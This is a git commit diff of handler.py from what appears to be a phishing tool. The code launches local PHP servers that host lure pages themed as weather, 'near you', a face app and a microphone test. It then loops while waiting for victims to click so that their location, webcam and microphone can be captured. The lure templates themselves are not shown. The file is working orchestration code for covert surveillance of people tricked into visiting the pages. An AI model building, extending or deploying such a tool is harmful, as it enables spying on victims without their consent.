3da534b702ff8317da77dddf562fe84429f12705
VCH <92458450+Inshanecr@users.noreply.github.com>
2022-06-13 15:58:48 +0430

    Update handler.py

--- module/handler.py
+++ module/handler.py
@@ -1,100 +1,62 @@
-from module import banner,localhost,paths,messages
-
-def weather_start():
-    banner.banner()
-    localhost.run_php_server(port=2897,dir_name="weather")
-    while True:
-        localhost.After_click(
-        after_click_template_name=paths.weather_temp("info"),
-        after_click_path_message=messages.show_message("loc"),
-        after_click_status='YES_CONTINUE'
-        )
-        if_exit = localhost.Before_click(
-            before_click_template_name=paths.weather_temp("result"),
-            before_click_status="DO_NOT_CONTINUE",
-            before_click_focus="location"
-            )
-
-        
-        exit_error = localhost.error_handler(paths.weather_temp("error"))
-        
-        if if_exit == "YES_EXIT" or exit_error == "YES_EXIT":
-            break
-        
-        elif if_exit == "NO_EXIT" or exit_error == "NO_EXIT":
-            pass
+from module import localhost,banner
+from module.paths import *
+from module.colors import c
 
 
 
 def normal_data():
-    banner.banner()
-    localhost.run_php_server(port=2525,dir_name="normal_data")
-    while True:
-        if_exit = localhost.After_click(
-        after_click_template_name=paths.normal_temp("info"),
-        after_click_status="NO_IM_NORMAL"
-        )
-
-        if if_exit == "YES_EXIT":
+       localhost.run_php_server(port=localhost.randPort,dir_name="normal_data")
+       banner.terminal_logo("NormalData")
+       while True:
+        localhost.After_click(dir_path=normal_temp("info"),message="loc")
+        back_menu = input(c.cyan+"\nDo you want to back menu ?"+c.yellow+" [y or n] "+c.re)
+        if back_menu.lower() == "y":
             break
-        
-        elif if_exit == "NO_EXIT":
-            pass
-
-
-
-def camera_temp_start():
-    banner.banner()
-    localhost.run_php_server(port=2627,dir_name="camera_temp")
+       localhost.kill()
+       
+       
+def weather_info():
+    localhost.run_php_server(port=localhost.randPort,dir_name="weather")
+    banner.terminal_logo("Weather")
     while True:
-
-        localhost.After_click(
-        after_click_template_name=paths.webcam_temp("face-app-info"),
-        after_click_path_message=messages.show_message("webcam"),
-        after_click_status='YES_CONTINUE'
-        )
-
-
-        if_exit = localhost.Before_click(
-            before_click_template_name=paths.webcam_temp("face-app-result"),
-            before_click_status="DO_NOT_CONTINUE",
-            before_click_focus="webcam"
-            )
-
-
-        
-        
-        if if_exit == "YES_EXIT":
+      localhost.After_click(dir_path=weather_temp("info"),message="loc")
+      localhost.Before_click(template=weather_temp("result"),before_click_focus="location")
+      back_menu = input(c.cyan+"\nDo you want to back menu ?"+c.yellow+" [y or n] "+c.re)
+      if back_menu.lower() == "y":
             break
-        
-        elif if_exit == "NO_EXIT":
-            pass
+    localhost.kill()
 
 
-def microphone_temp_start():
-    banner.banner()
-    localhost.run_php_server(port=2564,dir_name="microphone")
+def nearyou_info():
+    localhost.run_php_server(port=localhost.randPort,dir_name="nearyou")
+    banner.terminal_logo("NearYou")
     while True:
-
-        localhost.After_click(
-        after_click_template_name=paths.microphone_temp("microphone-info"),
-        after_click_path_message=messages.show_message("mic"),
-        after_click_status='YES_CONTINUE'
-        )
-
-
-        if_exit = localhost.Before_click(
-            before_click_template_name=paths.microphone_temp("microphone-result"),
-            before_click_status="DO_NOT_CONTINUE",
-            before_click_focus="microphone"
-            )
-
-
-        
-        
-        if if_exit == "YES_EXIT":
-            break
-        
-        elif if_exit == "NO_EXIT":
-            pass
-
+     localhost.After_click(dir_path=nearyou_temp("info"),message="loc")
+     localhost.Before_click(template=nearyou_temp("result"),before_click_focus="location")
+     back_menu = input(c.cyan+"\nDo you want to back menu ?"+c.yellow+" [y or n] "+c.re)
+     if back_menu.lower() == "y":
+            break      
+    localhost.kill()
+ 
+  
+def WebCamInfo():
+    localhost.run_php_server(port=localhost.randPort,dir_name="camera_temp")
+    banner.terminal_logo("WebCam")
+    while True:
+     localhost.After_click(dir_path=webcam_temp("face-app-info"),message="webcam")
+     localhost.Before_click(template=webcam_temp("face-app-result"),before_click_focus="webcam")
+     back_menu = input(c.cyan+"\nDo you want to back menu ?"+c.yellow+" [y or n] "+c.re)
+     if back_menu.lower() == "y":
+            break 
+    localhost.kill()
+    
+def MicrophoneInfo():
+    localhost.run_php_server(port=localhost.randPort,dir_name="microphone")
+    banner.terminal_logo("Microphone")
+    while True:
+     localhost.After_click(dir_path=microphone_temp("microphone-info"),message="mic") 
+     localhost.Before_click(template=microphone_temp("microphone-result"),before_click_focus="microphone")
+     back_menu = input(c.cyan+"\nDo you want to back menu ?"+c.yellow+" [y or n] "+c.re)
+     if back_menu.lower() == "y":
+            break        
+    localhost.kill()
